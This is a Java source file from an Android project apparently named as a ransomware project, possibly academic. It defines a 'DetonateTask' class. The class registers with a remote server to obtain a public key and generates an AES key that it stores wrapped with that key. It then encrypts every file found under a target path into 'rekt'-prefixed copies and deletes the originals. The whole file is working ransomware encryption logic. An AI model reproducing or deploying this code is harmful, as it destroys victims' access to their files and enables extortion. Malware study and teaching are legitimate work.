package fr.esgi.ransomware.task;

import android.content.Context;
import android.os.Handler;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.PublicKey;
import java.security.spec.AlgorithmParameterSpec;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import fr.esgi.ransomware.ApiService;
import fr.esgi.ransomware.Util;
import fr.esgi.ransomware.file_reader.FileFinderDetonate;
import retrofit2.Call;
import retrofit2.Response;

public class DetonateTask extends Task {

    public DetonateTask(Context context, Handler handler) {
        super(context, handler);
    }

    @Override
    public void run() throws Exception {
        Call<ApiService.Register.Response> call = Util.newRetrofitService().register(ApiService.Register.BUILD(context));
        Response<ApiService.Register.Response> response = call.execute();
        if (!response.isSuccessful()) {
            throw new RuntimeException("Failed to register (" + response.code() + " : " + response.errorBody().toString() + ")");
        }

        ApiService.Register.Response result = response.body();
        Util.sendLogMessage(handler, "Registered to API UUID=" + result.getUuid());

        PublicKey publicKey = Util.loadPublicKey(result.getPublicKey());
        Util.sendLogMessage(handler, "Public key loaded");


        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(Util.AES_KEY_SIZE);
        SecretKey key = keyGen.generateKey();
        byte[] aesKey = key.getEncoded();
        Util.sendLogMessage(handler, "AES Key Generated");


        Util.saveAesKey(aesKey, publicKey, context);
        Util.sendLogMessage(handler, "AES Key Saved");


        Cipher aesCipher = Cipher.getInstance(Util.AES_ALG);
        AlgorithmParameterSpec spec = new IvParameterSpec(Util.IV.getBytes());
        aesCipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(aesKey, "AES"), spec);


        File inputFile = new File(Util.PATH_TO_REKT);
        List<File> foundFiles = new FileFinderDetonate().findFiles(inputFile);
        Util.sendLogMessage(handler, "Found " + foundFiles.size() + " files to rekt");
        for (File file : foundFiles) {
            File encryptedFile = null;
            try {
                encryptedFile = rektFile(file, aesCipher);
                Util.sendLogMessage(handler, file.getAbsolutePath());
                file.delete();
            } catch (IOException e) {
                if (encryptedFile != null) {
                    encryptedFile.delete();
                }
                e.printStackTrace();
            }
        }

        Util.saveAesKey(aesKey, publicKey, context);
        Util.saveUUID(result.getUuid(), context);

        Util.sendLogMessage(handler, "----------------------------------------------------");
        Util.sendLogMessage(handler, "                         END");
        Util.sendLogMessage(handler, "----------------------------------------------------");
    }

    private File rektFile(File file, Cipher aesCipher) throws IOException {
        File outputFile = new File(file.getParent() + "/" + Util.PREFIX_FILE_REKT + file.getName());
        FileInputStream inputStream = null;
        CipherOutputStream outputStream = null;
        try {
            inputStream = new FileInputStream(file);

            outputStream = new CipherOutputStream(new FileOutputStream(outputFile), aesCipher);

            Util.copyStream(inputStream, outputStream);
        } finally {
            if (inputStream != null) inputStream.close();
            if (outputStream != null) outputStream.close();
        }
        return outputFile;
    }
}
